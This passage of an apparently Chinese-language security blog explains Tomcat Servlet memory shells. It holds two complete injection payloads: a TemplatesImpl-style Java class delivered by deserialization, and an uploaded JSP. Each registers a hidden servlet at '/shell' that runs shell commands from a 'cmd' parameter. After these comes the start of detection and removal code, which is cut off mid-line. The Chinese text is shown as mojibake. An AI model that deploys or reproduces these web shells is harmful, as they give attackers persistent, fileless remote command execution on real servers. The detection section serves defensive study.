Info&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">        out.println(output);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> HashSet&lt;Object&gt; h;</span><br><span class="line">    <span class="keyword">static</span> HttpServletRequest r;</span><br><span class="line">    <span class="keyword">static</span> HttpServletResponse p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilTemplatesImpl1</span><span class="params">()</span>&#123;</span><br><span class="line">        r = <span class="literal">null</span>;</span><br><span class="line">        p = <span class="literal">null</span>;</span><br><span class="line">        h =<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">        F(Thread.currentThread(),<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilTemplatesImpl1</span><span class="params">(String s)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">i</span><span class="params">(Object obj)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(obj==<span class="literal">null</span>|| h.contains(obj))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        h.add(obj);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">p</span><span class="params">(Object o, <span class="type">int</span> depth)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(depth &gt; <span class="number">52</span>||(r !=<span class="literal">null</span>&amp;&amp; p !=<span class="literal">null</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!i(o))&#123;</span><br><span class="line">            <span class="keyword">if</span>(r ==<span class="literal">null</span>&amp;&amp;HttpServletRequest.class.isAssignableFrom(o.getClass()))&#123;</span><br><span class="line">                r = (HttpServletRequest)o;</span><br><span class="line">                <span class="keyword">if</span>(r.getHeader(<span class="string">&quot;rainb0w&quot;</span>)==<span class="literal">null</span>) &#123;</span><br><span class="line">                    r = <span class="literal">null</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        p = (HttpServletResponse) r.getClass().getMethod(<span class="string">&quot;getResponse&quot;</span>).invoke(r);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        r = <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(r !=<span class="literal">null</span>&amp;&amp; p !=<span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">                AddMemoryShell(r,p);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            F(o,depth+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">F</span><span class="params">(Object start, <span class="type">int</span> depth)</span>&#123;</span><br><span class="line"></span><br><span class="line">        Class n=start.getClass();</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (Field declaredField : n.getDeclaredFields()) &#123;</span><br><span class="line">                declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    o = declaredField.get(start);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(!o.getClass().isArray())&#123;</span><br><span class="line">                        p(o,depth);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">for</span> (Object q : (Object[]) o) &#123;</span><br><span class="line">                            p(q, depth);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">while</span>(</span><br><span class="line">                (n = n.getSuperclass())!=<span class="literal">null</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">AddMemoryShell</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">EvilWrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">            <span class="comment">//(é‡è¦ï¼)æ­¤å¤„ä¸åˆ©ç”¨æ— å‚æ„é€ æ–¹æ³•è·å¾—EvilTemplatesImplå¯¹è±¡æ˜¯é¿å…å¾ªç¯æ‰§è¡Œæ— å‚æ„é€ æ–¹æ³•ä¸­çš„ä»£ç ï¼</span></span><br><span class="line">            <span class="type">Servlet</span> <span class="variable">evilServlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilTemplatesImpl1</span>(<span class="string">&quot;rainb0w&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> evilServlet.getClass().getSimpleName();</span><br><span class="line">            EvilWrapper.setName(ClassName);</span><br><span class="line">            EvilWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">            EvilWrapper.setServlet(evilServlet);</span><br><span class="line">            EvilWrapper.setServletClass(evilServlet.getClass().getName());</span><br><span class="line"></span><br><span class="line">            standardContext.addChild(EvilWrapper);</span><br><span class="line">            standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>, ClassName);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é˜…è¯»ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¿™é‡Œåˆ¤æ–­æ˜¯å¦è·å–åˆ°äº†å½“å‰è¯·æ±‚çš„requestå¯¹è±¡æ—¶ï¼Œæ˜¯é€šè¿‡åˆ¤æ–­å½“å‰è¯·æ±‚æ˜¯å¦å­˜åœ¨rainb0wè¯·æ±‚å¤´æ¥è¿›è¡Œçš„ã€‚å¦‚æœèƒ½å¤Ÿè·å–åˆ°å½“å‰è¯·æ±‚çš„requestå¯¹è±¡ï¼Œé‚£ä¹ˆå°±é€šè¿‡åå°„è·å–åˆ°å½“å‰è¯·æ±‚çš„responseå¯¹è±¡ã€‚æ¥ç€ä¼ å…¥åˆ°AddMemoryShellæ–¹æ³•ç”¨äºè·å–StandardContextã€‚å› æ­¤æˆ‘ä»¬åœ¨ä¼ å…¥ç”Ÿæˆçš„payloadçš„æ—¶å€™å°±éœ€è¦å‘é€rainb0wè¯·æ±‚å¤´ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26d921ddac507cc043fe8.jpg" title="image-20230803121203786" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d921ddac507cc043fe8.jpg" alt="image-20230803121203786"></a></p><p>å› ä¸ºé€šè¿‡è¿™ç§æ–¹æ³•è·å–requestå¯¹è±¡ä¸ç¨³å®šï¼Œå› æ­¤å¯èƒ½éœ€è¦ä¼ å…¥å¤šæ¬¡payloadã€‚</p><h4 id="ä¸Šä¼ jspæ³¨å…¥Tomcat-Servletå†…å­˜é©¬"><a href="#ä¸Šä¼ jspæ³¨å…¥Tomcat-Servletå†…å­˜é©¬" class="headerlink" title="ä¸Šä¼ jspæ³¨å…¥Tomcat-Servletå†…å­˜é©¬"></a>ä¸Šä¼ jspæ³¨å…¥Tomcat-Servletå†…å­˜é©¬</h4><p>ç›¸æ¯”ååºåˆ—åŒ–ä¼ å…¥å­—èŠ‚ç æ³¨å…¥å†…å­˜é©¬ç›¸æ¯”ï¼Œä¸Šä¼ jspçš„æ–¹æ³•åˆ™è¦ç®€å•çš„å¤šï¼Œå› æ­¤jspä¸­å†…ç½®requestå¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨å†…ç½®çš„requestå¯¹è±¡åå°„è·å¾—StandardContextï¼š</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletShell</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span>(command == <span class="literal">null</span>)&#123;</span><br><span class="line">                command = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br><span class="line">            br = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">stringBuffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine())!=<span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                stringBuffer.append(line + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            out.println(stringBuffer.toString());;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">( )</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextFiled</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextFiled.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextFiled</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextFiled.get(applicationContext);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    <span class="type">ServletShell</span> <span class="variable">servletShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletShell</span>();</span><br><span class="line">    wrapper.setName(servletShell.getClass().getSimpleName());</span><br><span class="line">    wrapper.setServlet(servletShell);</span><br><span class="line">    wrapper.setServletClass(servletShell.getClass().getName());</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>, servletShell.getClass().getSimpleName());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h4 id="Tomcat-Servlet-å‹å†…å­˜é©¬æŸ¥æ€"><a href="#Tomcat-Servlet-å‹å†…å­˜é©¬æŸ¥æ€" class="headerlink" title="Tomcat-Servlet å‹å†…å­˜é©¬æŸ¥æ€"></a>Tomcat-Servlet å‹å†…å­˜é©¬æŸ¥æ€</h4><p>å’ŒServletç›¸å…³çš„æ˜¯<code>children</code>å’Œ<code>servletMappings</code>ä¸¤ä¸ªå±æ€§ï¼Œè¿™ä¸¤ä¸ªå±æ€§åˆ†åˆ«ç»´æŠ¤ç€Servletçš„å®šä¹‰ï¼Œä»¥åŠServletçš„æ˜ å°„å…³ç³»ã€‚åœ¨StandardContextä¸­æœ‰removeChild()æ–¹æ³•æ¥åˆ é™¤æŒ‡å®šçš„Wrapperï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26dce1ddac507cc04deeb.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26dce1ddac507cc04deeb.jpg"></a></p><p>org.apache.catalina.core.StandardContext#removeServletMappingæ–¹æ³•é€šè¿‡æŒ‡å®šçš„patternåˆ é™¤Servletæ˜ å°„ã€‚</p><p><a href="https://pic.imgdb.cn/item/64d26ddf1ddac507cc05078b.jpg" title="image-20230808142716599" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26ddf1ddac507cc05078b.jpg" alt="image-20230808142716599"></a></p><p>æœ‰äº†è¿™ä¸¤ä¸ªæ–¹æ³•æˆ‘ä»¬å°±å¯ä»¥åˆ é™¤æ‰æŒ‡å®šçš„Servletäº†ã€‚é‚£æˆ‘ä»¬è¯¥æ€ä¹ˆçŸ¥é“å“ªäº›ç±»æ˜¯å†…å­˜é©¬éœ€è¦è¢«åˆ é™¤å‘¢ï¼Ÿæœ‰ä»¥ä¸‹å‡ ç§åˆ¤æ–­æ–¹æ³•ï¼š</p><ul><li><p>åˆ¤æ–­è¯¥Classæ˜¯å¦æœ‰å¯¹åº”çš„ç£ç›˜æ–‡ä»¶</p></li><li><p>dump Classå­—èŠ‚ç ï¼Œåç¼–è¯‘å®¡è®¡æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç </p></li><li><p>æ˜¯å¦è¢«å¯ç–‘çš„ClassLoaderæ‰€åŠ è½½ï¼Ÿ</p></li><li><p>æ ¹æ®ClassååŠurlpatternåˆ¤æ–­</p></li></ul><p>ä»¥ä¸‹ç»™å‡ºæŸ¥æ€ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Container&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardWrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URL&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Iterator&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getStandardContext</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">applicationContextFiled</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        applicationContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextFiled.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">standardContextFiled</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        standardContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextFiled.get(applicationContext);</span><br><span class="line">        <span class="keyword">return</span> standardContext;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> HashMap&lt;String, Container&gt; <span class="title function_">getChildren</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">standardContext</span> <span class="operator">=</span> getStandardContext(request);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">childrenFiled</span> <span class="operator">=</span> standardContext.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;children&quot;</span>);</span><br><span class="line">        childrenFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        HashMap&lt;String, Container&gt; children = (HashMap&lt;String, Container&gt;) childrenFiled.get(standardContext);</span><br><span class="line">        <span class="keyword">return</span> children;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> HashMap&lt;String, String&gt; <span class="title function_">getServletMaps</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">standardContext</span> <span class="operator">=</span> getStandardContext(request);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">servletMappingsField</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;servletMappings&quot;</span>);</span><br><span class="line">        servletMappingsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        HashMap&lt;String, String&gt; servletMappings = (HashMap&lt;String, String&gt;) servletMappingsField.get(standardContext);</span><br><span class="line">        <span class="keyword">return</span> servletMappings;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">classFileIsExists</span><span class="params">(Class clazz)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> clazz.getName();</span><br><span class="line">        <span class="type">String</span> <span class="variable">classNamePath</span> <span class="operator">=</span> className.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> clazz.getClassLoader().getResource(classNamePath);</span><br><span class="line">        <span class="keyword">if</span> (url == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isMemoryShell</span><span class="params">(String servletClassLoaderName, Class servletClass)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>((!servletClassLoaderName.contains(<span class="string">&quot;org.apache.catalina.loader&quot;</span>) &amp;&amp; !servletClassLoaderName.equals(<span 